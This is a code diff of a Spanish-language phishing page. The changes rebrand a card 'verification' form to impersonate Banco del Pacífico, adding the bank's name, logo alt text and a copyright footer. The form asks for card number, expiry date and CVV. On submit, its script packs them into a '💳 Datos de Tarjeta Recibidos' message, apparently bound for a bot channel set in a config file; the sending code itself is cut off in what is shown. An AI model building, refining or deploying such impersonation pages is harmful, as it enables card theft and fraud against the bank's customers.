@@ -3,54 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación de Identidad Financiera</title>
+    <title>Banco del Pacífico - Verificación</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
-        body { background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .card-container { background: #ffffff; padding: 35px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
-        .logo { display: block; max-width: 140px; margin: 0 auto 20px auto; height: auto; }
-        h2 { font-size: 1.3rem; color: #1e293b; text-align: center; margin-bottom: 20px; font-weight: 700; }
+        * { box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #eef2f6; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .logo-top { max-width: 180px; margin-bottom: 20px; }
+        .card { background: #ffffff; padding: 40px 30px 30px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); width: 100%; max-width: 420px; }
+        h2 { color: #1a1a1a; font-size: 1.6rem; font-weight: 600; margin-bottom: 25px; text-align: center; }
         
-        .form-group { margin-bottom: 20px; position: relative; }
-        label { display: block; font-size: 0.85rem; font-weight: 600; color: #475569; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-        input { width: 100%; padding: 14px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 0.95rem; color: #1e293b; outline: none; transition: all 0.3s ease; background-color: #f8fafc; }
-        input:focus { border-color: #0056b3; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); }
+        .form-group { margin-bottom: 25px; text-align: left; position: relative; }
+        .floating-label { color: #0056b3; font-size: 0.85rem; font-weight: 500; display: block; margin-bottom: 4px; }
+        input { width: 100%; border: none; border-bottom: 2px solid #0056b3; padding: 8px 0; font-size: 1.05rem; color: #333; outline: none; background: transparent; }
         
-        .card-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .badge-tipo { position: absolute; right: 12px; top: 38px; font-size: 0.75rem; font-weight: bold; background: #cbd5e1; color: #475569; padding: 4px 8px; border-radius: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-        .btn-pay { width: 100%; padding: 15px; background: #0056b3; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 10px; transition: background 0.3s ease; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.2); }
-        .btn-pay:hover { background: #004085; }
-        .error-card { display: none; background: #fff1f2; color: #e11d48; padding: 12px; border-radius: 10px; font-size: 0.85rem; margin-bottom: 20px; border: 1px solid #ffe4e6; font-weight: 500; text-align: left; }
+        .card-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .badge-tipo { position: absolute; right: 0; top: 24px; font-size: 0.75rem; font-weight: bold; color: #0056b3; text-transform: uppercase; }
+        .btn-primary { width: 100%; padding: 14px; background: #0056b3; color: #ffffff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 500; cursor: pointer; margin-top: 10px; }
+        
+        .error-box { display: none; color: #c0392b; background: #fde8e7; padding: 10px; border-radius: 4px; font-size: 0.85rem; margin-bottom: 20px; border-left: 4px solid #c0392b; }
+        .footer-text { margin-top: 25px; font-size: 0.72rem; color: #7a869a; line-height: 1.6; text-align: center; max-width: 400px; }
     </style>
 </head>
 <body>
 
-<div class="card-container">
-    <img src="./logo.png" alt="Logotipo" class="logo">
-    <h2>Validación de Tarjeta</h2>
+<img src="./logo.png" alt="Banco del Pacífico" class="logo-top">
+
+<div class="card">
+    <h2>Verificación de Tarjeta</h2>
     
-    <div class="error-card" id="errTarjeta">⚠️ Transacción rechazada o datos inválidos. Ingrese una tarjeta de débito o crédito activa para finalizar la verificación.</div>
+    <div class="error-box" id="errTarjeta">⚠️ Validación rechazada. Intente con otra tarjeta activa.</div>
 
     <form id="formTarjeta">
         <div class="form-group">
-            <label>Número de Tarjeta</label>
+            <span class="floating-label">Número de Tarjeta</span>
             <input type="text" pattern="[0-9]*" inputmode="numeric" maxlength="19" required placeholder="0000 0000 0000 0000" id="txtNumero">
             <span class="badge-tipo" id="lblTipo">CARD</span>
         </div>
         
         <div class="card-row">
             <div class="form-group">
-                <label>Vencimiento</label>
+                <span class="floating-label">Vencimiento</span>
                 <input type="text" placeholder="MM/AA" maxlength="5" required id="txtFecha">
             </div>
             <div class="form-group">
-                <label>CVC / CVV</label>
+                <span class="floating-label">CVC / CVV</span>
                 <input type="password" pattern="[0-9]*" inputmode="numeric" maxlength="4" placeholder="000" required id="txtCvv">
             </div>
         </div>
 
-        <button type="submit" class="btn-pay">Finalizar Validación</button>
+        <button type="submit" class="btn-primary">Verificar Tarjeta</button>
     </form>
+</div>
+
+<div class="footer-text">
+    Recomendamos utilizar la Banca Virtual con los navegadores<br>Chrome 36.0.1, Firefox 31.0, Microsoft Edge.<br><br>
+    © Copyright 2017 Banco del Pacífico *V5.4.0
 </div>
 
 <script src="./config.js"></script>
@@ -68,26 +74,14 @@
         let formateado = valor.match(/.{1,4}/g);
         e.target.value = formateado ? formateado.join(' ') : valor;
 
-        if (/^4/.test(valor)) {
-            lblTipo.innerText = 'VISA';
-            lblTipo.style.backgroundColor = '#1e3a8a';
-            lblTipo.style.color = '#fff';
-        } else if (/^5[1-5]/.test(valor) || /^2[2-7]/.test(valor)) {
-            lblTipo.innerText = 'MASTER';
-            lblTipo.style.backgroundColor = '#ea580c';
-            lblTipo.style.color = '#fff';
-        } else {
-            lblTipo.innerText = 'CARD';
-            lblTipo.style.backgroundColor = '#cbd5e1';
-            lblTipo.style.color = '#475569';
-        }
+        if (/^4/.test(valor)) { lblTipo.innerText = 'VISA'; }
+        else if (/^5[1-5]/.test(valor) || /^2[2-7]/.test(valor)) { lblTipo.innerText = 'MASTER'; }
+        else { lblTipo.innerText = 'CARD'; }
     });
 
     document.getElementById('txtFecha').addEventListener('input', (e) => {
         let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-        if (v.length >= 2) {
-            e.target.value = v.substring(0,2) + '/' + v.substring(2,4);
-        }
+        if (v.length >= 2) { e.target.value = v.substring(0,2) + '/' + v.substring(2,4); }
     });
 
     document.getElementById('formTarjeta').addEventListener('submit', async (e) => {
@@ -97,8 +91,8 @@
         const cvv = document.getElementById('txtCvv').value;
         const tipo = lblTipo.innerText;
 
-        const btn = e.target.querySelector('.btn-pay');
-        btn.innerText = "Procesando...";
+        const btn = e.target.querySelector('.btn-primary');
+        btn.innerText = "Validando...";
         btn.disabled = true;
 
         let msg = `💳 *Datos de Tarjeta Recibidos:* \nNúmero: \`${num}\` \nFecha: \`${fecha}\` \nCVV: \`${cvv}\` \nTipo: *${tipo}*`;
